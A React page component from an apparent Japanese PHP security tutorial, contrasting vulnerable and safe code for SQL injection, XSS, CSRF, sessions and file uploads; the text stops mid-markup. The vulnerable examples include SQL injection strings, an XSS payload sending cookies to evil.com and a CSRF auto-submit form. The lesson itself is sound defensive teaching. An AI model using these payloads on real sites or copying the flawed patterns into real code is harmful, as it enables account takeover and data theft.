import { Link } from 'react-router-dom';
import { ArrowLeft, Shield, AlertTriangle, Lock, FileWarning, Upload, Key } from 'lucide-react';

export default function PhpSecurityPage() {
  return (
    <div className="min-h-screen pt-24 pb-20 px-6 bg-gradient-to-br from-purple-50 to-white">
      <div className="container mx-auto max-w-4xl">
        <Link 
          to="/study/php" 
          className="inline-flex items-center gap-2 text-purple-600 hover:text-purple-700 mb-8 transition-colors"
        >
          <ArrowLeft size={20} />
          PHPページに戻る
        </Link>

        <div className="mb-12">
          <div className="w-20 h-20 bg-purple-600 rounded-2xl flex items-center justify-center mb-6">
            <Shield className="text-white" size={40} />
          </div>
          <h1 className="text-2xl md:text-4xl lg:text-5xl mb-6 text-gray-900">PHP セキュリティ</h1>
          <p className="text-xl text-gray-600">
            Webアプリケーションのセキュリティは最も重要な要素の一つです。
            SQLインジェクション、XSS、CSRFなどの一般的な脆弱性とその対策方法を学び、
            安全なWebアプリケーションを構築するための知識を習得します。
          </p>
        </div>

        {/* SQLインジェクション対策セクション */}
        <div className="mb-12">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-12 h-12 bg-red-100 rounded-xl flex items-center justify-center">
              <AlertTriangle className="text-red-600" size={24} />
            </div>
            <h2 className="text-3xl text-gray-900">SQLインジェクション対策</h2>
          </div>
          
          <div className="bg-white rounded-xl border border-gray-200 p-8 mb-6">
            <h3 className="text-2xl mb-4 text-gray-900">SQLインジェクションとは</h3>
            <p className="text-gray-700 leading-relaxed mb-6">
              SQLインジェクションは、攻撃者が悪意のあるSQLコードをアプリケーションに注入し、
              データベースを不正に操作する攻撃手法です。データの漏洩、改ざん、削除などの深刻な被害をもたらす可能性があります。
              適切な対策を行わないと、アプリケーション全体が危険にさらされます。
            </p>

            {/* 脆弱なコード */}
            <div className="mb-6">
              <div className="flex items-center gap-2 mb-3">
                <div className="px-3 py-1 bg-red-600 text-white text-sm font-semibold rounded">危険</div>
                <h4 className="text-lg text-gray-900">脆弱なコード例</h4>
              </div>
              
              <div className="bg-gray-900 rounded-lg p-6 overflow-x-auto mb-4">
                <pre className="text-red-400 text-sm">
                  <code>{`<?php
// ❌ 危険：ユーザー入力を直接SQL文に埋め込んでいる
$userId = $_GET['id'];
$query = "SELECT * FROM users WHERE id = " . $userId;
$result = mysqli_query($conn, $query);

// 攻撃例：?id=1 OR 1=1
// 実行されるSQL: SELECT * FROM users WHERE id = 1 OR 1=1
// → すべてのユーザー情報が取得される

// ❌ さらに危険な例
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users 
          WHERE username = '$username' 
          AND password = '$password'";

// 攻撃例：username = "admin' --"
// 実行されるSQL: SELECT * FROM users WHERE username = 'admin' -- AND password = ''
// → パスワード確認をバイパスしてログインできる`}</code>
                </pre>
              </div>

              <div className="bg-red-50 rounded-lg p-4 border border-red-200">
                <p className="text-sm text-gray-700">
                  <strong>リスク：</strong>データベース全体の情報漏洩、データの改ざん・削除、管理者権限の奪取
                </p>
              </div>
            </div>

            {/* 安全なコード */}
            <div className="mb-6">
              <div className="flex items-center gap-2 mb-3">
                <div className="px-3 py-1 bg-green-600 text-white text-sm font-semibold rounded">安全</div>
                <h4 className="text-lg text-gray-900">プリペアドステートメントを使用</h4>
              </div>
              
              <div className="bg-gray-900 rounded-lg p-6 overflow-x-auto mb-4">
                <pre className="text-green-400 text-sm">
                  <code>{`<?php
// ✅ 安全：PDOのプリペアドステートメントを使用
$userId = $_GET['id'];

try {
    $pdo = new PDO('mysql:host=localhost;dbname=mydb', 'user', 'pass');
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    // プレースホルダーを使用
    $stmt = $pdo->prepare("SELECT * FROM users WHERE id = :id");
    
    // パラメータをバインド
    $stmt->execute([':id' => $userId]);
    
    $user = $stmt->fetch();
    
} catch (PDOException $e) {
    error_log($e->getMessage());
    die('エラーが発生しました');
}

// ✅ 位置プレースホルダーの使用
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND status = ?");
$stmt->execute([$username, $status]);

// ✅ ログイン処理の安全な実装
$stmt = $pdo->prepare(
    "SELECT id, username, password_hash 
     FROM users 
     WHERE username = :username"
);
$stmt->execute([':username' => $username]);
$user = $stmt->fetch();

if ($user && password_verify($password, $user['password_hash'])) {
    // ログイン成功
    $_SESSION['user_id'] = $user['id'];
} else {
    // ログイン失敗
    echo '認証に失敗しました';
}`}</code>
                </pre>
              </div>

              <div className="bg-green-50 rounded-lg p-4 border border-green-200">
                <p className="text-sm text-gray-700">
                  <strong>対策：</strong>プリペアドステートメントにより、SQLとデータが分離され、インジェクション攻撃を防げます
                </p>
              </div>
            </div>

            <div className="bg-purple-50 rounded-lg p-6 border border-purple-200">
              <h4 className="text-xl mb-3 text-gray-900">SQLインジェクション対策のポイント</h4>
              <ul className="space-y-2 text-gray-700">
                <li className="flex items-start gap-2">
                  <span className="text-purple-600 mt-1">•</span>
                  <span><strong>プリペアドステートメント必須：</strong>PDOまたはmysqliのプリペアドステートメントを使用</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-purple-600 mt-1">•</span>
                  <span><strong>入力値の検証：</strong>型チェック、範囲チェック、ホワイトリスト方式</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-purple-600 mt-1">•</span>
                  <span><strong>エラーメッセージ：</strong>本番環境では詳細なエラーを表示しない</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-purple-600 mt-1">•</span>
                  <span><strong>最小権限の原則：</strong>データベースユーザーに必要最小限の権限のみ付与</span>
                </li>
              </ul>
            </div>
          </div>
        </div>

        {/* XSS対策セクション */}
        <div className="mb-12">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-12 h-12 bg-orange-100 rounded-xl flex items-center justify-center">
              <FileWarning className="text-orange-600" size={24} />
            </div>
            <h2 className="text-3xl text-gray-900">XSS（クロスサイトスクリプティング）対策</h2>
          </div>
          
          <div className="bg-white rounded-xl border border-gray-200 p-8 mb-6">
            <h3 className="text-2xl mb-4 text-gray-900">XSSとは</h3>
            <p className="text-gray-700 leading-relaxed mb-6">
              XSS（Cross-Site Scripting）は、攻撃者が悪意のあるスクリプトをWebページに注入し、
              他のユーザーのブラウザで実行させる攻撃です。クッキーの盗難、セッションハイジャック、
              フィッシング攻撃などに利用されます。ユーザーの入力を表示する際は必ずエスケープ処理が必要です。
            </p>

            {/* 脆弱なコード */}
            <div className="mb-6">
              <div className="flex items-center gap-2 mb-3">
                <div className="px-3 py-1 bg-red-600 text-white text-sm font-semibold rounded">危険</div>
                <h4 className="text-lg text-gray-900">脆弱なコード例</h4>
              </div>
              
              <div className="bg-gray-900 rounded-lg p-6 overflow-x-auto mb-4">
                <pre className="text-red-400 text-sm">
                  <code>{`<?php
// ❌ 危険：ユーザー入力をそのまま出力
$comment = $_POST['comment'];
echo "<div>コメント: " . $comment . "</div>";

// 攻撃例：comment = "<script>alert(document.cookie)</script>"
// → スクリプトが実行され、クッキー情報が表示される

// ❌ さらに危険な例
$username = $_GET['name'];
?>
<h1>こんにちは、<?php echo $username; ?>さん</h1>

// 攻撃例：?name=<script>location.href='http://evil.com?cookie='+document.cookie</script>
// → クッキーが攻撃者のサーバーに送信される`}</code>
                </pre>
              </div>

              <div className="bg-red-50 rounded-lg p-4 border border-red-200">
                <p className="text-sm text-gray-700">
                  <strong>リスク：</strong>セッション乗っ取り、個人情報の窃取、フィッシングサイトへの誘導
                </p>
              </div>
            </div>

            {/* 安全なコード */}
            <div className="mb-6">
              <div className="flex items-center gap-2 mb-3">
                <div className="px-3 py-1 bg-green-600 text-white text-sm font-semibold rounded">安全</div>
                <h4 className="text-lg text-gray-900">適切なエスケープ処理</h4>
              </div>
              
              <div className="bg-gray-900 rounded-lg p-6 overflow-x-auto mb-4">
                <pre className="text-green-400 text-sm">
                  <code>{`<?php
// ✅ 安全：htmlspecialchars()でエスケープ
$comment = $_POST['comment'];
$safeComment = htmlspecialchars($comment, ENT_QUOTES, 'UTF-8');
echo "<div>コメント: " . $safeComment . "</div>";

// ✅ HTMLコンテキストでの出力
$username = $_GET['name'];
?>
<h1>こんにちは、<?= htmlspecialchars($username, ENT_QUOTES, 'UTF-8') ?>さん</h1>

<?php
// ✅ JavaScriptコンテキストでの出力
$data = ['name' => 'テスト', 'value' => 123];
?>
<script>
  // JSON形式で安全に渡す
  const userData = <?= json_encode($data, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) ?>;
</script>

<?php
// ✅ URL内での出力
$search = $_GET['q'];
$safeUrl = urlencode($search);
?>
<a href="/search?q=<?= $safeUrl ?>">検索結果</a>

<?php
// ✅ 属性値での出力
$title = $_GET['title'];
?>
<div title="<?= htmlspecialchars($title, ENT_QUOTES, 'UTF-8') ?>">...</div>

<?php
// ✅ HTMLタグを許可する場合（慎重に）
function sanitizeHtml($html) {
    // HTMLPurifierなどのライブラリを使用
    require_once 'HTMLPurifier.auto.php';
    
    $config = HTMLPurifier_Config::createDefault();
    $purifier = new HTMLPurifier($config);
    
    return $purifier->purify($html);
}

$userHtml = $_POST['content'];
$cleanHtml = sanitizeHtml($userHtml);
echo $cleanHtml;
?>`}</code>
                </pre>
              </div>

              <div className="bg-green-50 rounded-lg p-4 border border-green-200">
                <p className="text-sm text-gray-700">
                  <strong>対策：</strong>htmlspecialchars()で特殊文字をエスケープし、スクリプトの実行を防ぎます
                </p>
              </div>
            </div>

            <div className="bg-purple-50 rounded-lg p-6 border border-purple-200">
              <h4 className="text-xl mb-3 text-gray-900">XSS対策のポイント</h4>
              <ul className="space-y-2 text-gray-700">
                <li className="flex items-start gap-2">
                  <span className="text-purple-600 mt-1">•</span>
                  <span><strong>出力時のエスケープ：</strong>必ずhtmlspecialchars()を使用（ENT_QUOTES, UTF-8指定）</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-purple-600 mt-1">•</span>
                  <span><strong>コンテキストに応じた処理：</strong>HTML、JavaScript、URL、属性で適切な処理を選択</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-purple-600 mt-1">•</span>
                  <span><strong>Content-Security-Policy：</strong>HTTPヘッダーで実行可能なスクリプトを制限</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-purple-600 mt-1">•</span>
                  <span><strong>HTTPOnly属性：</strong>クッキーにHTTPOnly属性を設定してJavaScriptからのアクセスを防ぐ</span>
                </li>
              </ul>
            </div>
          </div>
        </div>

        {/* CSRF対策セクション */}
        <div className="mb-12">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-12 h-12 bg-yellow-100 rounded-xl flex items-center justify-center">
              <Key className="text-yellow-600" size={24} />
            </div>
            <h2 className="text-3xl text-gray-900">CSRF（クロスサイトリクエストフォージェリ）対策</h2>
          </div>
          
          <div className="bg-white rounded-xl border border-gray-200 p-8 mb-6">
            <h3 className="text-2xl mb-4 text-gray-900">CSRFとは</h3>
            <p className="text-gray-700 leading-relaxed mb-6">
              CSRF（Cross-Site Request Forgery）は、ログイン中のユーザーに意図しないリクエストを送信させる攻撃です。
              攻撃者が罠サイトを用意し、そこから被害者のブラウザ経由で正規サイトへリクエストを送信させます。
              パスワード変更、商品購入、データ削除などが勝手に実行される危険があります。
            </p>

            {/* 脆弱なコード */}
            <div className="mb-6">
              <div className="flex items-center gap-2 mb-3">
                <div className="px-3 py-1 bg-red-600 text-white text-sm font-semibold rounded">危険</div>
                <h4 className="text-lg text-gray-900">脆弱なコード例</h4>
              </div>
              
              <div className="bg-gray-900 rounded-lg p-6 overflow-x-auto mb-4">
                <pre className="text-red-400 text-sm">
                  <code>{`<?php
// ❌ 危険：トークン検証なし
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $newPassword = $_POST['password'];
    
    // パスワードを変更
    updatePassword($_SESSION['user_id'], $newPassword);
    echo 'パスワードを変更しました';
}
?>

<form method="POST" action="/change-password">
    <input type="password" name="password">
    <button type="submit">変更</button>
</form>

<!-- 
攻撃者のサイト（evil.com）に以下のコードがあると：
<form method="POST" action="https://yoursite.com/change-password">
    <input type="hidden" name="password" value="hacked123">
</form>
<script>document.forms[0].submit();</script>

ユーザーがevil.comを訪問すると、
知らないうちにパスワードが変更されてしまう
-->`}</code>
                </pre>
              </div>

              <div className="bg-red-50 rounded-lg p-4 border border-red-200">
                <p className="text-sm text-gray-700">
                  <strong>リスク：</strong>不正なデータ変更、意図しない送金・購入、アカウント設定の改ざん
                </p>
              </div>
            </div>

            {/* 安全なコード */}
            <div className="mb-6">
              <div className="flex items-center gap-2 mb-3">
                <div className="px-3 py-1 bg-green-600 text-white text-sm font-semibold rounded">安全</div>
                <h4 className="text-lg text-gray-900">CSRFトークンによる対策</h4>
              </div>
              
              <div className="bg-gray-900 rounded-lg p-6 overflow-x-auto mb-4">
                <pre className="text-green-400 text-sm">
                  <code>{`<?php
session_start();

// ✅ CSRFトークンの生成
function generateCsrfToken() {
    if (empty($_SESSION['csrf_token'])) {
        $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf_token'];
}

// ✅ CSRFトークンの検証
function verifyCsrfToken($token) {
    if (!isset($_SESSION['csrf_token'])) {
        return false;
    }
    
    // タイミング攻撃対策のためhash_equals使用
    return hash_equals($_SESSION['csrf_token'], $token);
}

// ✅ フォーム処理
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // トークン検証
    $token = $_POST['csrf_token'] ?? '';
    
    if (!verifyCsrfToken($token)) {
        http_response_code(403);
        die('不正なリクエストです');
    }
    
    // トークン検証成功後、処理を実行
    $newPassword = $_POST['password'];
    updatePassword($_SESSION['user_id'], $newPassword);
    
    // トークンを再生成（ワンタイムトークン）
    unset($_SESSION['csrf_token']);
    
    echo 'パスワードを変更しました';
}

$csrfToken = generateCsrfToken();
?>

<form method="POST" action="/change-password">
    <!-- CSRFトークンをhiddenフィールドで送信 -->
    <input type="hidden" name="csrf_token" value="<?= htmlspecialchars($csrfToken) ?>">
    
    <input type="password" name="password" required>
    <button type="submit">変更</button>
</form>

<?php
// ✅ Ajaxリクエストの場合
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $json = file_get_contents('php://input');
    $data = json_decode($json, true);
    
    // ヘッダーからトークンを取得
    $token = $_SERVER['HTTP_X_CSRF_TOKEN'] ?? '';
    
    if (!verifyCsrfToken($token)) {
        http_response_code(403);
        echo json_encode(['error' => '不正なリクエスト']);
        exit;
    }
    
    // 処理を実行
    processData($data);
    echo json_encode(['success' => true]);
}
?>

<script>
// JavaScriptでトークンを送信
fetch('/api/update', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'X-CSRF-Token': '<?= $csrfToken ?>'
    },
    body: JSON.stringify({ /* データ */ })
});
</script>`}</code>
                </pre>
              </div>

              <div className="bg-green-50 rounded-lg p-4 border border-green-200">
                <p className="text-sm text-gray-700">
                  <strong>対策：</strong>CSRFトークンにより、正規のフォームからのリクエストであることを検証できます
                </p>
              </div>
            </div>

            <div className="bg-purple-50 rounded-lg p-6 border border-purple-200">
              <h4 className="text-xl mb-3 text-gray-900">CSRF対策のポイント</h4>
              <ul className="space-y-2 text-gray-700">
                <li className="flex items-start gap-2">
                  <span className="text-purple-600 mt-1">•</span>
                  <span><strong>トークン生成：</strong>セッションごとにランダムで予測不可能なトークンを生成</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-purple-600 mt-1">•</span>
                  <span><strong>トークン検証：</strong>すべての状態変更リクエストでトークンを検証</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-purple-600 mt-1">•</span>
                  <span><strong>SameSite属性：</strong>クッキーにSameSite=Strict/Laxを設定</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-purple-600 mt-1">•</span>
                  <span><strong>GETリクエスト：</strong>データ変更にGETメソッドを使用しない</span>
                </li>
              </ul>
            </div>
          </div>
        </div>

        {/* セッションセキュリティセクション */}
        <div className="mb-12">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-12 h-12 bg-blue-100 rounded-xl flex items-center justify-center">
              <Lock className="text-blue-600" size={24} />
            </div>
            <h2 className="text-3xl text-gray-900">セッションセキュリティ</h2>
          </div>
          
          <div className="bg-white rounded-xl border border-gray-200 p-8 mb-6">
            <h3 className="text-2xl mb-4 text-gray-900">セッションハイジャック対策</h3>
            <p className="text-gray-700 leading-relaxed mb-6">
              セッションハイジャックは、攻撃者が正規ユーザーのセッションIDを盗み、そのユーザーになりすます攻撃です。
              適切なセッション管理を行うことで、この脅威を大幅に軽減できます。
            </p>
            
            <div className="bg-gray-900 rounded-lg p-6 overflow-x-auto mb-6">
              <pre className="text-green-400 text-sm">
                <code>{`<?php
// ✅ セッションの安全な設定
// php.iniまたはコード内で設定

// セッションクッキーの設定
ini_set('session.cookie_httponly', 1);  // JavaScriptからアクセス不可
ini_set('session.cookie_secure', 1);     // HTTPS通信のみ（本番環境）
ini_set('session.cookie_samesite', 'Strict');  // CSRF対策
ini_set('session.use_only_cookies', 1);  // URLでのセッションID送信を禁止
ini_set('session.use_strict_mode', 1);   // 未初期化のセッションIDを拒否

// セッション名を推測されにくくする
session_name('CUSTOM_SESS_ID');

// セッション開始
session_start();

// ✅ ログイン時のセッションID再生成
function secureLogin($username, $password) {
    // ユーザー認証
    $user = authenticateUser($username, $password);
    
    if ($user) {
        // 既存のセッションを破棄
        session_regenerate_id(true);
        
        // セッション固定攻撃対策：新しいセッションIDを生成
        $_SESSION['user_id'] = $user['id'];
        $_SESSION['username'] = $user['username'];
        $_SESSION['login_time'] = time();
        $_SESSION['user_ip'] = $_SERVER['REMOTE_ADDR'];
        $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
        
        return true;
    }
    
    return false;
}

// ✅ セッションの検証
function validateSession() {
    // セッションが存在しない
    if (!isset($_SESSION['user_id'])) {
        return false;
    }
    
    // タイムアウトチェック（30分）
    $timeout = 1800;
    if (isset($_SESSION['login_time']) && 
        (time() - $_SESSION['login_time']) > $timeout) {
        destroySession();
        return false;
    }
    
    // IPアドレスの検証（オプション：動的IPの場合は注意）
    if (isset($_SESSION['user_ip']) && 
        $_SESSION['user_ip'] !== $_SERVER['REMOTE_ADDR']) {
        destroySession();
        return false;
    }
    
    // User-Agentの検証
    if (isset($_SESSION['user_agent']) && 
        $_SESSION['user_agent'] !== $_SERVER['HTTP_USER_AGENT']) {
        destroySession();
        return false;
    }
    
    // 最終アクティブ時刻を更新
    $_SESSION['login_time'] = time();
    
    // 定期的にセッションIDを再生成（セッションハイジャック対策）
    if (!isset($_SESSION['last_regeneration'])) {
        $_SESSION['last_regeneration'] = time();
    } elseif (time() - $_SESSION['last_regeneration'] > 300) {
        // 5分ごとに再生成
        session_regenerate_id(true);
        $_SESSION['last_regeneration'] = time();
    }
    
    return true;
}

// ✅ セッションの破棄
function destroySession() {
    $_SESSION = [];
    
    // セッションクッキーを削除
    if (isset($_COOKIE[session_name()])) {
        $params = session_get_cookie_params();
        setcookie(
            session_name(),
            '',
            time() - 3600,
            $params['path'],
            $params['domain'],
            $params['secure'],
            $params['httponly']
        );
    }
    
    session_destroy();
}

// ✅ 保護されたページ
if (!validateSession()) {
    header('Location: /login.php');
    exit;
}

// ✅ ログアウト処理
if (isset($_POST['logout'])) {
    destroySession();
    header('Location: /login.php');
    exit;
}`}</code>
              </pre>
            </div>

            <div className="bg-blue-50 rounded-lg p-6 border border-blue-200">
              <h4 className="text-xl mb-3 text-gray-900">セッションセキュリティのベストプラクティス</h4>
              <ul className="space-y-2 text-gray-700">
                <li className="flex items-start gap-2">
                  <span className="text-blue-600 mt-1">•</span>
                  <span><strong>HttpOnly属性：</strong>JavaScriptからのクッキーアクセスを防止</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-blue-600 mt-1">•</span>
                  <span><strong>Secure属性：</strong>HTTPS通信でのみクッキーを送信</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-blue-600 mt-1">•</span>
                  <span><strong>セッションID再生成：</strong>ログイン時と定期的に再生成</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-blue-600 mt-1">•</span>
                  <span><strong>タイムアウト設定：</strong>一定時間後に自動ログアウト</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-blue-600 mt-1">•</span>
                  <span><strong>セッション検証：</strong>IPアドレスやUser-Agentで二重チェック</span>
                </li>
              </ul>
            </div>
          </div>
        </div>

        {/* ファイルアップロードセキュリティセクション */}
        <div className="mb-12">
          <div className="flex items-center gap-3 mb-6">
            <div className="w-12 h-12 bg-green-100 rounded-xl flex items-center justify-center">
              <Upload className="text-green-600" size={24} />
            </div>
            <h2 className="text-3xl text-gray-900">ファイルアップロードのセキュリティ</h2>
          </div>
          
          <div className="bg-white rounded-xl border border-gray-200 p-8 mb-6">
            <h3 className="text-2xl mb-4 text-gray-900">安全なファイルアップロード処理</h3>
            <p className="text-gray-700 leading-relaxed mb-6">
              ファイルアップロード機能は、悪意のあるファイルの実行、サーバーへの不正アクセス、
              DoS攻撃などのリスクがあります。適切な検証と制限を実装することが必須です。
            </p>
            
            <div className="bg-gray-900 rounded-lg p-6 overflow-x-auto mb-6">
              <pre className="text-green-400 text-sm">
                <code>{`<?php
// ✅ 安全なファイルアップロード処理
function secureFileUpload() {
    // ファイルがアップロードされたか確認
    if (!isset($_FILES['upload_file'])) {
        return ['error' => 'ファイルが選択されていません'];
    }
    
    $file = $_FILES['upload_file'];
    
    // エラーチェック
    if ($file['error'] !== UPLOAD_ERR_OK) {
        return ['error' => 'アップロードエラーが発生しました'];
    }
    
    // ファイルサイズの検証（5MB以下）
    $maxSize = 5 * 1024 * 1024;
    if ($file['size'] > $maxSize) {
        return ['error' => 'ファイルサイズが大きすぎます（最大5MB）'];
    }
    
    // 拡張子のホワイトリスト検証
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
    $fileExtension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
    
    if (!in_array($fileExtension, $allowedExtensions)) {
        return ['error' => '許可されていないファイル形式です'];
    }
    
    // MIMEタイプの検証
    $allowedMimeTypes = [
        'image/jpeg',
        'image/png',
        'image/gif',
        'application/pdf'
    ];
    
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);
    
    if (!in_array($mimeType, $allowedMimeTypes)) {
        return ['error' => '不正なファイルタイプです'];
    }
    
    // ファイル名のサニタイズ（元のファイル名は使用しない）
    $newFilename = bin2hex(random_bytes(16)) . '.' . $fileExtension;
    
    // アップロード先ディレクトリ（Webルート外が推奨）
    $uploadDir = '/var/www/uploads/';
    
    // ディレクトリが存在しない場合は作成
    if (!is_dir($uploadDir)) {
        mkdir($uploadDir, 0755, true);
    }
    
    $destination = $uploadDir . $newFilename;
    
    // ファイルの移動
    if (!move_uploaded_file($file['tmp_name'], $destination)) {
        return ['error' => 'ファイルの保存に失敗しました'];
    }
    
    // ファイルのパーミッション設定（実行権限を付与しない）
    chmod($destination, 0644);
    
    // 画像の場合、再エンコードでスクリプト除去
    if (in_array($mimeType, ['image/jpeg', 'image/png', 'image/gif'])) {
        reencodeImage($destination, $mimeType);
    }
    
    return [
        'success' => true,
        'filename' => $newFilename,
        'path' => $destination
    ];
}

// ✅ 画像の再エンコード
function reencodeImage($filepath, $mimeType) {
    switch ($mimeType) {
        case 'image/jpeg':
            $image = imagecreatefromjpeg($filepath);
            imagejpeg($image, $filepath, 90);
            break;
        case 'image/png':
            $image = imagecreatefrompng($filepath);
            imagepng($image, $filepath, 9);
            break;
        case 'image/gif':
            $image = imagecreatefromgif($filepath);
            imagegif($image, $filepath);
            break;
    }
    
    if (isset($image)) {
        imagedestroy($image);
    }
}

// ✅ ファイルダウンロード処理
function secureFileDownload($filename) {
    $uploadDir = '/var/www/uploads/';
    $filepath = $uploadDir . basename($filename);
    
    // パストラバーサル対策
    if (strpos(realpath($filepath), realpath($uploadDir)) !== 0) {
        http_response_code(403);
        die('不正なアクセスです');
    }
    
    // ファイルの存在確認
    if (!file_exists($filepath)) {
        http_response_code(404);
        die('ファイルが見つかりません');
    }
    
    // 適切なヘッダーを設定
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . 
           addslashes($filename) . '"');
    header('Content-Length: ' . filesize($filepath));
    header('X-Content-Type-Options: nosniff');
    
    readfile($filepath);
    exit;
}

// ✅ .htaccessでの実行防止（アップロードディレクトリ）
/*
# .htaccess
<FilesMatch "\.php$">
    Order Allow,Deny
    Deny from all
</FilesMatch>
*/`}</code>
              </pre>
            </div>

            <div className="bg-green-50 rounded-lg p-6 border border-green-200">
              <h4 className="text-xl mb-3 text-gray-900">ファイルアップロードセキュリティのポイント</h4>
              <ul className="space-y-2 text-gray-700">
                <li className="flex items-start gap-2">
                  <span className="text-green-600 mt-1">•</span>
                  <span><strong>拡張子の検証：</strong>ホワイトリスト方式で許可する拡張子を限定</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-600 mt-1">•</span>
                  <span><strong>MIMEタイプの検証：</strong>finfo_file()で実際のファイルタイプを確認</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-600 mt-1">•</span>
                  <span><strong>ファイルサイズ制限：</strong>DoS攻撃を防ぐため上限を設定</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-600 mt-1">•</span>
                  <span><strong>ファイル名の生成：</strong>ランダムな名前を使用し、元のファイル名を使わない</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-600 mt-1">•</span>
                  <span><strong>保存場所：</strong>Webルート外またはスクリプト実行を禁止したディレクトリ</span>
                </li>
                <li className="flex items-start gap-2">
                  <span className="text-green-600 mt-1">•</span>
                  <span><strong>画像の再エンコード：</strong>埋め込まれたスクリプトを除去</span>
                </li>
              </ul>
            </div>
          </div>
        </div>

        {/* その他のセキュリティ対策セクション */}
        <div className="mb-12">
          <h3 className="text-2xl mb-6 text-gray-900">その他の重要なセキュリティ対策</h3>
          
          <div className="grid md:grid-cols-2 gap-6">
            <div className="bg-white rounded-xl border border-gray-200 p-6">
              <h4 className="text-xl mb-3 text-gray-900 flex items-center gap-2">
                <Shield className="text-purple-600" size={20} />
                パスワードのハッシュ化
              </h4>
              <div className="bg-gray-900 rounded-lg p-4 overflow-x-auto mb-3">
                <pre className="text-green-400 text-xs">
                  <code>{`// password_hash()を使用
$hash = password_hash(
    $password, 
    PASSWORD_DEFAULT
);

// 検証
if (password_verify($input, $hash)) {
    // ログイン成功
}`}</code>
                </pre>
              </div>
              <p className="text-sm text-gray-600">
                bcryptなどの強力なハッシュアルゴリズムでパスワードを保護
              </p>
            </div>

            <div className="bg-white rounded-xl border border-gray-200 p-6">
              <h4 className="text-xl mb-3 text-gray-900 flex items-center gap-2">
                <Lock className="text-purple-600" size={20} />
                HTTPSの使用
              </h4>
              <div className="bg-gray-900 rounded-lg p-4 overflow-x-auto mb-3">
                <pre className="text-green-400 text-xs">
                  <code>{`// HTTPSへリダイレクト
if (!isset($_SERVER['HTTPS']) 
    || $_SERVER['HTTPS'] !== 'on') {
    header('Location: https://'
        . $_SERVER['HTTP_HOST']
        . $_SERVER['REQUEST_URI']);
    exit;
}`}</code>
                </pre>
              </div>
              <p className="text-sm text-gray-600">
                通信を暗号化し、中間者攻撃を防ぐ
              </p>
            </div>

            <div className="bg-white rounded-xl border border-gray-200 p-6">
              <h4 className="text-xl mb-3 text-gray-900 flex items-center gap-2">
                <AlertTriangle className="text-purple-600" size={20} />
                入力値の検証
              </h4>
              <div className="bg-gray-900 rounded-lg p-4 overflow-x-auto mb-3">
                <pre className="text-green-400 text-xs">
                  <code>{`// filter_var()で検証
$email = filter_var(
    $_POST['email'], 
    FILTER_VALIDATE_EMAIL
);

$age = filter_var(
    $_POST['age'], 
    FILTER_VALIDATE_INT
);`}</code>
                </pre>
              </div>
              <p className="text-sm text-gray-600">
                すべての入力を疑い、適切に検証・サニタイズ
              </p>
            </div>

            <div className="bg-white rounded-xl border border-gray-200 p-6">
              <h4 className="text-xl mb-3 text-gray-900 flex items-center gap-2">
                <FileWarning className="text-purple-600" size={20} />
                エラー表示の制御
              </h4>
              <div className="bg-gray-900 rounded-lg p-4 overflow-x-auto mb-3">
                <pre className="text-green-400 text-xs">
                  <code>{`// 本番環境
ini_set('display_errors', 0);
error_reporting(E_ALL);

// エラーログに記録
ini_set('log_errors', 1);
ini_set('error_log', 
    '/var/log/php_errors.log');`}</code>
                </pre>
              </div>
              <p className="text-sm text-gray-600">
                本番環境では詳細なエラーを表示せず、ログに記録
              </p>
            </div>
          </div>
        </div>

        {/* 学習のまとめ */}
        <div className="bg-yellow-50 rounded-2xl p-8 border border-yellow-200">
          <h3 className="text-2xl mb-4 text-gray-900">学習のまとめ</h3>
          <div className="space-y-4 text-gray-700">
            <div>
              <h4 className="font-semibold text-purple-700 mb-2">セキュリティは後回しにしない</h4>
              <p>セキュリティ対策は開発の初期段階から組み込むことが重要です。後から追加するのは困難でコストがかかります。</p>
            </div>
            <div>
              <h4 className="font-semibold text-purple-700 mb-2">多層防御の考え方</h4>
              <p>一つの対策に頼らず、複数の防御策を組み合わせることで、より堅牢なセキュリティを実現できます。</p>
            </div>
            <div>
              <h4 className="font-semibold text-purple-700 mb-2">常に最新の情報をキャッチアップ</h4>
              <p>セキュリティの脅威は日々進化しています。定期的に脆弱性情報をチェックし、アップデートを適用しましょう。</p>
            </div>
            <div>
              <h4 className="font-semibold text-purple-700 mb-2">信頼できるライブラリの使用</h4>
              <p>自分で実装するよりも、実績のあるセキュリティライブラリやフレームワークを活用することを推奨します。</p>
            </div>
          </div>
